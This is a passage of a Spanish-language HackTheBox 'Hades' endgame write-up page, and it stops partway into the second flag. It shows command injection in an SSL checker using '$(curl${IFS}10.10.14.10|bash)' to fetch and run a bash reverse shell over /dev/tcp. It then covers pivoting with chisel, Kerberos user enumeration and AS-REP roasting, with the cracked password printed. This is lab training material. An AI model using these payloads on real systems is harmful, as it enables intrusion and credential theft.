@@ -1,0 +1,1908 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width initial-scale=1" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="robots" content="noindex">
+
+  <title>Writeup HackTheBox Hades</title>
+
+  <meta name="description" content="Resolución del endgame Hades de la plataforma de HackTheBox">
+  <meta name="author" content="GatoGamer1155">
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Writeup HackTheBox Hades">
+  <meta name="twitter:description" content="Resolución del endgame Hades de la plataforma de HackTheBox">
+  <meta name="twitter:creator" content="GatoGamer1155">  
+  <meta name="twitter:image" content="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/wr/hades.png" />
+
+  <meta property="og:site_name" content="GatoGamer1155" />
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Writeup HackTheBox Hades">
+  <meta property="og:description" content="Resolución del endgame Hades de la plataforma de HackTheBox">
+  <meta property="og:image" content="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/wr/hades.png" />
+
+  <link rel="manifest" href="/images/favicons/manifest.json">
+  <link rel="shortcut icon" type="image/png" sizes="64x64" href="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/wr/hades.png">
+
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+  
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+
+  <link rel="stylesheet" href="/css/main.css?1678854914750547280">
+  <link rel="canonical" href="http://localhost:4000/">
+  <link rel="alternate" type="application/rss+xml" title="Writeup HackTheBox Hades" href="/feed.xml">
+</head>
+
+  <body style="background-color: #282828;">
+  
+    <span class="mobile btn-mobile-menu">
+      <i class="icon icon-list btn-mobile-menu__icon"></i>
+      <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
+    </span>
+
+<header class="panel-cover" style="background-image: url(/images/cover.jpg)">
+
+  <div class="panel-main">
+    <div class="panel-main__inner panel-inverted">
+      <div class="panel-main__content">
+
+          <img src="/images/profile.jpg" class="user-image zoomable" alt="GatoGamer1155">
+          <h1 class="panel-cover__title panel-title scale-up-center">GatoGamer1155</h1>
+
+        <hr class="panel-cover__divider">
+        <p class="panel-cover__description slide-top">Entusiasta del Hacking y CTFs</p>
+        <hr class="panel-cover__divider panel-cover__divider--secondary">
+
+        <div class="navigation-wrapper">
+         <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+              <li class="navigation__item grow"><a href="/endgames" title="GatoGamer1155" class="blog-button">EndGames</a></li>
+            </ul>
+          </nav>
+
+          <nav class="cover-navigation navigation--social">
+            <ul class="navigation">
+              
+              <li class="navigation__item grow">
+                <a href="https://github.com/gatogamer1155" title="Github" target="_blank">
+                  <i class="icon icon-social-github"></i>
+                  <span class="label">GitHub</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://twitter.com/gatogamer1155" title="Twitter" target="_blank">
+                  <i class="icon icon-social-twitter"></i>
+                  <span class="label">Twitter</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://instagram.com/gatogamer1155" title="Instagram" target="_blank">
+                  <i class="icon icon-social-instagram"></i>
+                  <span class="label">Instagram</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://youtube.com/@gatogamer1155" title="Youtube" target="_blank">
+                  <i class="icon icon-social-youtube"></i>
+                  <span class="label">Youtube</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="mailto:gatogamer1155@gmail.com" title="Correo Electronico" target="_blank">
+                  <i class="icon icon-mail"></i>
+                  <span class="label">Email</span>
+                </a>
+              </li>
+
+            </ul>
+          </nav>
+        </div>
+      </div>
+    </div>
+
+    <div class="panel-cover--overlay"></div>
+  </div>
+</header>
+    <br>
+    <div class="content-wrapper">
+      <div class="content-wrapper__inner">
+        <article class="post-container post-container--single">
+    <div class="izquierda">
+      <h3 class="post-title">Contenido</h3><br>
+      <ul>
+        <li><a href="#flag1">Chasm</a></li>
+        <li><a href="#flag2">Guardian</a></li>
+        <li><a href="#flag3">Messenger</a></li>
+        <li><a href="#flag4">Resurrection</a></li>
+        <li><a href="#flag5">Gateway</a></li>
+        <li><a href="#flag6">Celestial</a></li>
+        <li><a href="#flag7">Dominion</a></li>
+      </ul>
+  </div>
+
+  <header class="post-header slide-top">
+    <h4 class="post-title">HackTheBox</h4>
+    <picture><img src="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/wr/hades.png" style="float: right; margin-right:0px; margin-left:0px; height:60px;" class="include_image zoomable"/></picture>
+    <h2 class="post-title">Hades</h2><br>
+  </header>
+  
+<section class="post" id="flag1">
+<br><h3 class="post-title">Chasm</h3>
+<h4 class="post-title">HADES{Fr4gil3_b1aCkli5tiNg}</h4><br>
+
+<p class="plain-text">Iniciamos la máquina escaneando los puertos de la máquina con <code class="language-plaintext highlighter-rouge">nmap</code> donde encontramos solo ub puerto abierto que es un servicio web por <code class="language-plaintext highlighter-rouge">https</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ nmap </span><span class="p">10.13.38.16
+Nmap scan report for 10.13.38.16  
+PORT    STATE SERVICE
+443/tcp open  https</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Podemos ver una página <code class="language-plaintext highlighter-rouge">web</code> que de primeras no parece tener nada realmente interesante, aunque en la parte superior encontramos varias <code class="language-plaintext highlighter-rouge">pestañas</code> con funciones</p>
+<a href="/endgames/hades/1.png" target="_blank"><div><p><img src="/endgames/hades/1.png"></p></div></a>   
+
+<p class="plain-text">Hay una pestaña <code class="language-plaintext highlighter-rouge">SSL TOOLS</code> la cual tiene un <code class="language-plaintext highlighter-rouge">checker</code> de certificados <code class="language-plaintext highlighter-rouge">ssl</code>, en donde puedes checkear el <code class="language-plaintext highlighter-rouge">certificado</code> de una dirección ip o dominio con un servicio https</p>
+<a href="/endgames/hades/3.png" target="_blank"><div><p><img src="/endgames/hades/3.png"></p></div></a>
+
+<p class="plain-text">Usando <code class="language-plaintext highlighter-rouge">mitmdump</code> podemos estar en escucha por el puerto <code class="language-plaintext highlighter-rouge">443</code> de las peticiones que emite contra el certificado para <code class="language-plaintext highlighter-rouge">capturar</code> algo de información de la <code class="language-plaintext highlighter-rouge">petición</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ sudo mitmdump</span><span class="p"> -p 443 --mode reverse:https://10.13.38.16 --ssl-insecure --set flow_detail=2  
+reverse proxy to https://10.13.38.16 listening at *:443.</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ahora en la web hacemos que emita el <code class="language-plaintext highlighter-rouge">check</code> contra nuestra direccion <code class="language-plaintext highlighter-rouge">ip</code> de la vpn</p>
+<a href="/endgames/hades/4.png" target="_blank"><div><p><img src="/endgames/hades/4.png"></p></div></a>
+
+<p class="plain-text"><code class="language-plaintext highlighter-rouge">Mitdump</code> nos reporta varias cosas de la <code class="language-plaintext highlighter-rouge">petición</code> capturada entre ellas la cabecera <code class="language-plaintext highlighter-rouge">User-Agent</code> que es <code class="language-plaintext highlighter-rouge">curl/7.58.0</code>, la petición ha sido emitida desde un <code class="language-plaintext highlighter-rouge">comando</code></>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ sudo mitmdump</span><span class="p"> -p 443 --mode reverse:https://10.13.38.16 --ssl-insecure --set flow_detail=2  
+reverse proxy to https://10.13.38.16 listening at *:443.
+</span><span class="am">[10.13.38.15:58110] </span><span class="p">client connect
+</span><span class="am">[10.13.38.15:58110] </span><span class="p">server connect 10.13.38.16:443
+10.13.38.16:49511: </span><span class="ve">GET </span><span class="p">https://10.13.38.16/
+    </span><span class="az">Host</span><span class="p">: 10.13.38.16
+    </span><span class="az">User-Agent</span><span class="p">: curl/7.58.0
+    </span><span class="az">Accept</span><span class="p">: */*
+ << </span><span class="ve">200 OK </span><span class="p">14.3k
+    </span><span class="az">Date</span><span class="p">: Thu, 27 Apr 2023 03:11:12 GMT
+    </span><span class="az">Server</span><span class="p">: Apache/2.4.29 (Ubuntu)
+    </span><span class="az">X-Frame-Options</span><span class="p">: DENY
+    </span><span class="az">X-Content-Type-Options</span><span class="p">: nosniff
+    </span><span class="az">Last-Modified</span><span class="p">: Thu, 05 Sep 2019 15:58:47 GMT
+    </span><span class="az">ETag</span><span class="p">: "3960-591d0659f7d83"
+    </span><span class="az">Accept-Ranges</span><span class="p">: bytes
+    </span><span class="az">Content-Length</span><span class="p">: 14688
+    </span><span class="az">Vary</span><span class="p">: Accept-Encoding
+    </span><span class="az">Content-Type</span><span class="p">: text/html
+</span><span class="am">[10.13.38.16:49511] </span><span class="p">client disconnect
+</span><span class="am">[10.13.38.16:49511] </span><span class="p">server disconnect 10.13.38.16:443</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Podemos agregar un <code class="language-plaintext highlighter-rouge">$(id)</code> en la dirección web de nuestro servidor, asi si se ejecuta el comando <code class="language-plaintext highlighter-rouge">id</code> este nos devolvera el output con el <code class="language-plaintext highlighter-rouge">usuario</code> que lo ha ejecutado</p>
+<a href="/endgames/hades/5.png" target="_blank"><div><p><img src="/endgames/hades/5.png"></p></div></a>
+
+<p class="plain-text">En la petición pordemos ver que ha intentado hacer una <code class="language-plaintext highlighter-rouge">petición</code> a nuestra ip en el recurso <code class="language-plaintext highlighter-rouge">uid=33(www-data)</code> que es el resultado del comando <code class="language-plaintext highlighter-rouge">id</code> ejecutado</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ sudo mitmdump</span><span class="p"> -p 443 --mode reverse:https://10.13.38.16 --ssl-insecure --set flow_detail=1  
+reverse proxy to https://10.13.38.16 listening at *:443.
+</span><span class="am">[10.13.38.16:49550] </span><span class="p">client connect
+</span><span class="am">[10.13.38.16:49550] </span><span class="p">server connect 10.13.38.16:443
+10.13.38.16:49550: </span><span class="ve">GET </span><span class="p">https://10.13.38.16/uid=33(www-data)
+                << </span><span class="ro">404 Not Found </span><span class="p">274b
+</span><span class="am">[10.13.38.16:49550] </span><span class="p">client disconnect
+</span><span class="am">[10.13.38.16:49550] </span><span class="p">server disconnect 10.13.38.16:443</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Para obtener una <code class="language-plaintext highlighter-rouge">shell</code> en la máquina crearemos un archivo <code class="language-plaintext highlighter-rouge">index.html</code> que tenga una revshell en <code class="language-plaintext highlighter-rouge">bash</code>, y lo compartiremos a traves de un servidor <code class="language-plaintext highlighter-rouge">http</code> de python</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ cat </span><span class="p">index.html
+bash -i >& /dev/tcp/10.10.14.10/443 0>&1
+
+</span><span class="ve">❯ sudo python3</span><span class="p"> -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Despues de probar la ejecucion normal notamos que hay una <code class="language-plaintext highlighter-rouge">blacklist</code> con algunos caracteres incluido el <code class="language-plaintext highlighter-rouge">espacio</code>, pero podemos cambiar el espacio por un <code class="language-plaintext highlighter-rouge">${IFS}</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">10.10.14.10/$(curl 10.10.14.10 | bash)
+
+10.10.14.10/$(curl${IFS}10.10.14.10|bash)  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al enviar la petición cargara nuestro <code class="language-plaintext highlighter-rouge">index.html</code> con la <code class="language-plaintext highlighter-rouge">revshell</code> y al ejecutarla con <code class="language-plaintext highlighter-rouge">bash</code> recibimos una shell como <code class="language-plaintext highlighter-rouge">www-data</code> donde encontramos la primera <code class="language-plaintext highlighter-rouge">flag</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ sudo netcat</span><span class="p"> -lvnp 443
+Listening on 0.0.0.0 443
+Connection received on 10.13.38.16
+</span><span class="ve">www-data@cee1146c7ac1</span><span class="p">:</span><span class="az">~/html/ssltools</span><span class="p">$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</span><span class="ve">www-data@cee1146c7ac1</span><span class="p">:</span><span class="az">~/html/ssltools</span><span class="p">$ hostname -I
+172.17.0.2
+</span><span class="ve">www-data@cee1146c7ac1</span><span class="p">:</span><span class="az">~/html/ssltools</span><span class="p">$ ls
+0fe092ba0_flag.txt  </span><span class="ve">certificate.php</span><span class="p">  </span><span class="sa">logo.png</span><span class="p">
+</span><span class="ve">www-data@cee1146c7ac1</span><span class="p">:</span><span class="az">~/html/ssltools</span><span class="p">$ cat 0fe092ba0_flag.txt  
+HADES{Fr4gil3_b1aCkli5tiNg}
+</span><span class="ve">www-data@cee1146c7ac1</span><span class="p">:</span><span class="az">~/html/ssltools</span><span class="p">$</span>
+</code></pre></div></div><br>
+</section>
+
+<section class="post" id="flag2">
+<br><h3 class="post-title">Guardian</h3>
+<h4 class="post-title">HADES{DoNt_d1s4ble_K3rbeRos_Pre_aUth3nticat1on}</h4><br>
+
+<p class="plain-text">Parece que estamos en un <code class="language-plaintext highlighter-rouge">contenedor</code> de docker, nuestra direccion ip es la <code class="language-plaintext highlighter-rouge">.2</code> al probar credenciales <code class="language-plaintext highlighter-rouge">defecto</code> en la <code class="language-plaintext highlighter-rouge">.1</code> podemos ingresar como el usuario <code class="language-plaintext highlighter-rouge">docker</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">www-data@cee1146c7ac1</span><span class="p">:</span><span class="az">~</span><span class="p">$ ssh docker@172.17.0.1
+docker@172.17.0.1's password: tcuser
+   ( '>')
+  /) TC (\   Core is distributed with ABSOLUTELY NO WARRANTY.  
+ (/-_--_-\)           www.tinycorelinux.net
+
+</span><span class="ve">docker@default</span><span class="p">:</span><span class="az">~</span><span class="p">$ id
+uid=1000(docker) gid=50(staff) groups=50(staff),100(docker)
+</span><span class="ve">docker@default</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Tenemos <code class="language-plaintext highlighter-rouge">ALL</code> en privilegios de <code class="language-plaintext highlighter-rouge">sudoers</code>, con un <code class="language-plaintext highlighter-rouge">sudo su</code> nos convertimos en <code class="language-plaintext highlighter-rouge">root</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">docker@default</span><span class="p">:</span><span class="az">~</span><span class="p">$ sudo su
+</span><span class="ve">root@default</span><span class="p">:</span><span class="az">~</span><span class="p"># id
+uid=0(root) gid=0(root) groups=0(root)  
+</span><span class="ve">root@default</span><span class="p">:</span><span class="az">~</span><span class="p">#</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">En las <code class="language-plaintext highlighter-rouge">interfaces</code> de red de este contenedor podemos encontrar <code class="language-plaintext highlighter-rouge">5</code> direcciones diferentes, entre ellas una que llama la atención es la <code class="language-plaintext highlighter-rouge">eth1</code> con el <code class="language-plaintext highlighter-rouge">192.168.99.100</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">root@default</span><span class="p">:</span><span class="az">~</span><span class="p"># ifconfig
+docker0   Link encap:Ethernet  HWaddr 02:42:57:6D:1C:4B
+          inet addr:172.17.0.1  Bcast:172.17.255.255  Mask:255.255.0.0
+          inet6 addr: fe80::42:57ff:fe6d:1c4b/64 Scope:Link
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:5276 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:6767 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0
+          RX bytes:483614 (472.2 KiB)  TX bytes:9003824 (8.5 MiB)
+
+eth0      Link encap:Ethernet  HWaddr 08:00:27:20:AF:32
+          inet addr:10.0.2.15  Bcast:10.0.2.255  Mask:255.255.255.0
+          inet6 addr: fe80::a00:27ff:fe20:af32/64 Scope:Link
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:16931 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:6608 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000
+          RX bytes:18015028 (17.1 MiB)  TX bytes:709915 (693.2 KiB)
+
+eth1      Link encap:Ethernet  HWaddr 08:00:27:E6:B0:30
+          inet addr:192.168.99.100  Bcast:192.168.99.255  Mask:255.255.255.0  
+          inet6 addr: fe80::a00:27ff:fee6:b030/64 Scope:Link
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:445 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:472 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000
+          RX bytes:75865 (74.0 KiB)  TX bytes:221543 (216.3 KiB)
+
+lo        Link encap:Local Loopback
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          inet6 addr: ::1/128 Scope:Host
+          UP LOOPBACK RUNNING  MTU:65536  Metric:1
+          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000
+          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)
+
+veth9d30111 Link encap:Ethernet  HWaddr BA:FE:39:D2:E9:6D
+          inet6 addr: fe80::b8fe:39ff:fed2:e96d/64 Scope:Link
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:5276 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:6781 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0
+          RX bytes:557478 (544.4 KiB)  TX bytes:9004900 (8.5 MiB)
+
+</span><span class="ve">root@default</span><span class="p">:</span><span class="az">~</span><span class="p">#</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Sabemos que estamos en un lab de <code class="language-plaintext highlighter-rouge">AD</code> asi que con un binario estatico de <a href="https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap">nmap</a> buscamos direcciones con el puerto <code class="language-plaintext highlighter-rouge">SMB</code> sobre la <code class="language-plaintext highlighter-rouge">182.168.*.*</code>, encontramos 3</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">www-data@cee1146c7ac1</span><span class="p">:</span><span class="az">/tmp</span><span class="p">$ ./nmap -v -T5 -Pn -n -p 445 --open 192.168.*.*/24  
+Nmap scan report for 192.168.3.201
+PORT    STATE SERVICE
+445/tcp open  microsoft-ds
+
+Nmap scan report for 192.168.3.202
+PORT    STATE SERVICE
+445/tcp open  microsoft-ds
+
+Nmap scan report for 192.168.3.203
+PORT    STATE SERVICE
+445/tcp open  microsoft-ds
+</span><span class="ve">www-data@cee1146c7ac1</span><span class="p">:</span><span class="az">/tmp</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Podemos aplicar un <code class="language-plaintext highlighter-rouge">escaneo</code> un poco mas largo para descubrir todos los <code class="language-plaintext highlighter-rouge">puertos</code> abiertos en cada uno de los 3 <code class="language-plaintext highlighter-rouge">hosts</code> windows que hemos encontrado anteriormente</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">www-data@cee1146c7ac1</span><span class="p">:</span><span class="az">/tmp</span><span class="p">$ ./nmap -T5 -Pn -n 192.168.3.201  
+Nmap scan report for 192.168.3.201
+PORT     STATE SERVICE
+135/tcp  open  loc-srv
+445/tcp  open  microsoft-ds
+5985/tcp open  unknown
+</span><span class="ve">www-data@cee1146c7ac1</span><span class="p">:</span><span class="az">/tmp</span><span class="p">$ ./nmap -T5 -Pn -n 192.168.3.202
+Nmap scan report for 192.168.3.202
+PORT     STATE SERVICE
+80/tcp   open  http
+135/tcp  open  loc-srv
+443/tcp  open  https
+445/tcp  open  microsoft-ds
+5985/tcp open  unknown
+</span><span class="ve">www-data@cee1146c7ac1</span><span class="p">:</span><span class="az">/tmp</span><span class="p">$ ./nmap -T5 -Pn -n 192.168.3.203
+Nmap scan report for 192.168.3.203
+PORT     STATE SERVICE
+53/tcp   open  domain
+88/tcp   open  kerberos-sec
+135/tcp  open  loc-srv
+445/tcp  open  microsoft-ds
+464/tcp  open  kpasswd5
+593/tcp  open  http-rpc-epmap
+636/tcp  open  ldapssl
+3268/tcp open  globalcatLDAP
+3269/tcp open  globalcatLDAPssl
+5985/tcp open  unknown
+</span><span class="ve">www-data@cee1146c7ac1</span><span class="p">:</span><span class="az">/tmp</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Para tener <code class="language-plaintext highlighter-rouge">conexión</code> con ellos desde nuestro equipo con <code class="language-plaintext highlighter-rouge">chisel</code> crearemos una conexión de tipo <code class="language-plaintext highlighter-rouge">socks</code> la cual pasara por el puerto <code class="language-plaintext highlighter-rouge">1080</code> para redirigir el trafico</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">www-data@cee1146c7ac1</span><span class="p">:</span><span class="az">/tmp</span><span class="p">$ ./chisel client 10.10.14.10:9999 R:0.0.0.0:1080:socks &  
+</span><span class="ve">www-data@cee1146c7ac1</span><span class="p">:</span><span class="az">/tmp</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ chisel </span><span class="p">server --reverse --port 9999
+server: Reverse tunnelling enabled
+server: Listening on http://0.0.0.0:9999
+server: session#1: tun: proxy#R:1080=>socks: Listening  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ahora haciendo uso de <code class="language-plaintext highlighter-rouge">proxychains</code> logramos tener <code class="language-plaintext highlighter-rouge">conexión</code> con los tres equipos windows, con <code class="language-plaintext highlighter-rouge">crackmapexec</code> podemos ver los nombres de equipos <code class="language-plaintext highlighter-rouge">DEV</code>, <code class="language-plaintext highlighter-rouge">WEB</code> y <code class="language-plaintext highlighter-rouge">DC1</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ proxychains</span><span class="p"> -q crackmapexec smb 192.168.3.201-203
+</span><span class="az">SMB         </span><span class="p">192.168.3.201   445    DEV              </span><span class="az">[*] </span><span class="p">Windows Server 2019 Standard 17763 x64 (name:DEV) (domain:htb.local) (signing:False) (SMBv1:True)
+</span><span class="az">SMB         </span><span class="p">192.168.3.202   445    WEB              </span><span class="az">[*] </span><span class="p">Windows Server 2012 R2 Standard 9600 x64 (name:WEB) (domain:htb.local) (signing:False) (SMBv1:True)  
+</span><span class="az">SMB         </span><span class="p">192.168.3.203   445    DC1              </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:DC1) (domain:htb.local) (signing:True) (SMBv1:False)</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Por comodidad y posibles proximos ataques agregaremos al archivo <code class="language-plaintext highlighter-rouge">/etc/hosts</code> las direcciones <code class="language-plaintext highlighter-rouge">ip</code> con su <code class="language-plaintext highlighter-rouge">dominio</code> que sera el <code class="language-plaintext highlighter-rouge">hostname</code> y el dominio <code class="language-plaintext highlighter-rouge">htb.local</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ tail</span><span class="p"> -n3 /etc/hosts
+192.168.3.201 dev.htb.local
+192.168.3.202 web.htb.local
+192.168.3.203 dc1.htb.local  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Usando <code class="language-plaintext highlighter-rouge">kerbrute</code> podemos enumerar usuarios hacia el <code class="language-plaintext highlighter-rouge">DC</code> aplicando fuerza bruta, esto se debe hacer desde el <code class="language-plaintext highlighter-rouge">contenedor</code> ya que mediante el <code class="language-plaintext highlighter-rouge">proxy</code> no funcionara</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">www-data@cee1146c7ac1</span><span class="p">:</span><span class="az">/tmp</span><span class="p">$ ./kerbrute userenum names.txt -d htb.local --dc 192.168.3.203  
+    __             __               __
+   / /_____  _____/ /_  _______  __/ /____
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/
+
+>  Using KDC(s):
+>      192.168.3.203:88
+
+</span><span class="ve">>  [+] VALID USERNAME:     bob@htb.local
+>  [+] VALID USERNAME:     dev@htb.local
+
+www-data@cee1146c7ac1</span><span class="p">:</span><span class="az">/tmp</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Guardamos ambos usuarios encontrados en un archivo <code class="language-plaintext highlighter-rouge">users.txt</code> y con <code class="language-plaintext highlighter-rouge">GetNPUsers</code> intentamos un <code class="language-plaintext highlighter-rouge">ASREPRoast</code> hacia ambos, el usuario <code class="language-plaintext highlighter-rouge">bob</code> nos devuelve un <code class="language-plaintext highlighter-rouge">hash</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ proxychains</span><span class="p"> -q impacket-GetNPUsers htb.local/dc1.htb.local -dc-ip 192.168.3.203 -no-pass -usersfile users.txt  
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+$krb5asrep$23$bob@HTB.LOCAL:be52854293467eeb1900407ac6fef3ef$af612e3bbe242084e7095bb1bac4a6d6fa5b6607bc348655bd5ab20c057e17c21f785963c03c3207b33ee9a6d6f984ce01cad6e5416826a9fb5327fdf3853cb7c94151251445f533fbdab291d569a68c8ef1a44c807acbb424985f3274d9492656868d3922d25a744c3bbdc4deb543064ba4964175a4238ac1dcff471b890e254526b5bd4836281406cb2c927e26b17288e909be954dd0008b4ce998bc77cfd0795c8f50b56948adf24ab8f9ee9461e80f2e91178c1310fe1f1a8ceaaafe2b8d48393d9d20aeed3bd1966aadcdf2e4309dc1f774b7b6a195fc0a135c782cf2e9ec6b0108f73e
+[-] User dev doesn't have UF_DONT_REQUIRE_PREAUTH set</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Con <code class="language-plaintext highlighter-rouge">john</code> podemos romper facilmente el <code class="language-plaintext highlighter-rouge">hash</code> de bob, obtenemos su contraseña</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ john</span><span class="p"> -w:/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 XOP 4x2])  
+Press 'q' or Ctrl-C to abort, almost any other key for status
+</span><span class="am">Passw0rd1!</span><span class="p">       (</span><span class="am">$krb5asrep$23$bob@HTB.LOCAL</span><span class="p">)
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Las validamos con <code class="language-plaintext highlighter-rouge">crackmapexec</code> y listando <code class="language-plaintext highlighter-rouge">recursos</code> compartidos a nivel de smb en <code class="language-plaintext highlighter-rouge">DC1</code> podemos ver que ahora tenemos privilegios de <code class="language-plaintext highlighter-rouge">lectura</code> en el recurso <code class="language-plaintext highlighter-rouge">Users</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ proxychains</span><span class="p"> -q crackmapexec smb dc1.htb.local -u bob -p Passw0rd1! --shares
+</span><span class="az">SMB         </span><span class="p">dc1.htb.local   445    DC1              </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:DC1) (domain:htb.local) (signing:True) (SMBv1:False)  
+</span><span class="az">SMB         </span><span class="p">dc1.htb.local   445    DC1              </span><span class="ve">[+] </span><span class="p">htb.local\bob:Passw0rd1! 
+</span><span class="az">SMB         </span><span class="p">dc1.htb.local   445    DC1              </span><span class="ve">[+] </span><span class="p">Enumerated shares
+</span><span class="az">SMB         </span><span class="p">dc1.htb.local   445    DC1              </span><span class="am">Share           Permissions     Remark
+</span><span class="az">SMB         </span><span class="p">dc1.htb.local   445    DC1              </span><span class="am">-----           -----------     ------
+</span><span class="az">SMB         </span><span class="p">dc1.htb.local   445    DC1              </span><span class="am">ADMIN$                          Remote Admin
+</span><span class="az">SMB         </span><span class="p">dc1.htb.local   445    DC1              </span><span class="am">C$                              Default share
+</span><span class="az">SMB         </span><span class="p">dc1.htb.local   445    DC1              </span><span class="am">IPC$            READ            Remote IPC
+</span><span class="az">SMB         </span><span class="p">dc1.htb.local   445    DC1              </span><span class="am">NETLOGON        READ            Logon server share 
+</span><span class="az">SMB         </span><span class="p">dc1.htb.local   445    DC1              </span><span class="am">SYSVOL          READ            Logon server share 
